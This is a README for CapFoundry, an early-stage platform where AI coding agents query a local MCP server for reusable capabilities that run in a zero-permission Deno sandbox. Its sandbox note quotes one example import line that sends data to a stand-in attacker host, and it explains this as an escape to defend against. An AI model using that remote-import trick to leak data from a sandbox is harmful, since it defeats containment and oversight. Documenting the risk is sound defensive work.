# CapFoundry

> **Don't generate what you already know.**

CapFoundry is an experimental, demand-driven software capability platform for humans and AI agents.

Before an AI agent solves a software task, it can ask its local **CapFoundry Capabilities Manager (CFCM)**:

> **Can CapFoundry already do this?**

If a suitable capability exists, CFCM resolves its artifact and normally executes it locally. If no suitable capability exists, the agent solves the problem normally and can then consider whether the new solution should become a CapFoundry capability.

The architectural shorthand is:

> **Centralize knowledge. Decentralize execution.**

## Current status

CapFoundry is in **early implementation**. Phase 0 and Phase 1 of the [implementation PRD](PRD.md)
are done: CFCM runs as a local MCP server that searches a compact index, resolves and verifies an
artifact, executes it in a zero-permission Deno subprocess, and writes local telemetry — proven end
to end on one capability, `CapFoundry.geo.distance`.

The remaining six public capabilities, the private and `Local.*` fixtures, candidate submission,
the Capability Awareness Skill, the A/B evaluation harness and Explore are still ahead.

## Quick start

Requires [Deno](https://deno.com) 2.x.

```bash
# Verify every capability package, then build the registry index
deno task validate
deno task build-index

# Run the full suite: search, sandbox escapes, cache integrity, telemetry redaction
deno task test
```

Point CFCM at this repository as its registry and register it with a coding agent:

```bash
cp cfcm.example.json cfcm.json          # set "registry" to "." to use this checkout
deno task cfcm:mcp                      # speaks MCP over stdio
```

In Claude Code, register the server once:

```bash
claude mcp add cfcm -- deno run --allow-read --allow-write --allow-net --allow-run --allow-env \
  /absolute/path/to/CapFoundry/cfcm/mcp/server.ts
```

The agent then gets three tools — `cfcm_search`, `cfcm_invoke` and `cfcm_describe`. A confident
search that is given input runs the capability in the same call, so the common case costs one
round trip.

### A note on the sandbox

Capability artifacts execute in their own Deno subprocess with **no `--allow-*` flag at all**, plus
`--no-remote`, `--no-npm` and a cleared environment. Zero permissions on its own is not enough:
Deno does not gate remote module loading behind `--allow-net`, so a static
`import "https://attacker.example/?data=..."` inside an artifact would be fetched before any
permission check ran. See SEC-10 in the [PRD](PRD.md) and the escape tests in
`tests/sandbox_test.ts`.

## Documentation

The current documents are:

- **[Vision & Architecture v0.5](docs/vision/CapFoundry-Vision-Architecture-v0.5.md)** — the broader product model, architectural principles, CFCM, namespaces, governance, security, discovery, telemetry and future direction.
- **[MVP v0.2](docs/mvp/CapFoundry-MVP-v0.2.md)** — the deliberately smaller first implementation and the experiments needed to prove or falsify the core idea.
- **[Implementation PRD v1.0](PRD.md)** — the buildable plan derived from MVP v0.2: architecture decisions, features with acceptance criteria, explicit data model, and phased delivery.

The Vision document describes where CapFoundry may go. The MVP document describes what should actually be built first. The PRD describes how to build it.

## First planned capabilities

The MVP starts with five small capabilities spread across domains plus two richer examples:

```text
CapFoundry.text.slugify
CapFoundry.date.businessDaysBetween
CapFoundry.geo.distance
CapFoundry.validation.iban
CapFoundry.csv.detectDelimiter
CapFoundry.json.schema.infer
CapFoundry.ui.dataTable
```

`CapFoundry.json.schema.infer` provides a larger deterministic benchmark. `CapFoundry.ui.dataTable` tests a different part of the model by returning an HTML Custom Element artifact.

## Capability packages

A complete namespaced capability is conceptually distributed as a **CFP — CapFoundry Package**. A CFP is expected to contain the capability contract, artifact, tests, provenance, license information and execution/permission metadata.

A future Capability Packager Skill should be able to inspect existing code, other capabilities, packages or a GitHub repository, discuss possible capability boundaries with the user, and produce a complete namespaced CFP. This includes appropriately licensed open-source code, for example MIT-licensed projects, while preserving license and provenance information.

## Ownership

CapFoundry is owned and developed by **Netsi**.

GitHub: **[@netsi1964](https://github.com/netsi1964)**  
X: **[@netsi1964](https://x.com/netsi1964)**

## License

CapFoundry is licensed under the **Apache License 2.0**. See [LICENSE](LICENSE).

Individual capability artifacts and CFP packages may use their own compatible licenses. Their license and provenance must be explicit rather than implicitly inherited from the CapFoundry platform.
